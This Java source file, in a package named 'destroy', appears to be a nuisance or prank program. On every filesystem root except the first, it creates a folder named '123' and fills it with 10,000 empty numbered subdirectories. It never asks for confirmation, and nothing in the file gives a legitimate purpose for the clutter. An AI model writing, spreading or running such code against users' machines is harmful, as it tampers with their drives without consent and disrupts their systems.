package destroy;
import java.io.*;
import java.nio.file.Files;

public class create {

	File array[];
	int i,j;
	create()
	{
		check();
	}

	private void check() {
		array=File.listRoots();
		
		for(i=1;i<array.length;i++)
		{
			/*if(!array[i].getAbsolutePath().equalsIgnoreCase("E:\\"))
			{*/
			File sub[]=array[i].listFiles();
			System.out.println(sub.length);
			for(j=0;j<sub.length;j++)
			{
				if(sub[j].isDirectory() && sub[j].getName().equalsIgnoreCase("123"))
				{
					break;
				}
			}
			if(j==sub.length)
			{
				make();
			}
			//}
		}
	}

	private void make() {
		File f= new File(array[i].getAbsoluteFile()+"123");
		if(f.mkdir())
		{
			System.out.println("done");
			for(int h=0;h<10000;h++)
			{
				File c=new File(f.getAbsoluteFile()+"\\"+h);
				if(c.mkdir())
				{
					System.out.println("done");
				}
			}
		}
		
	}
}
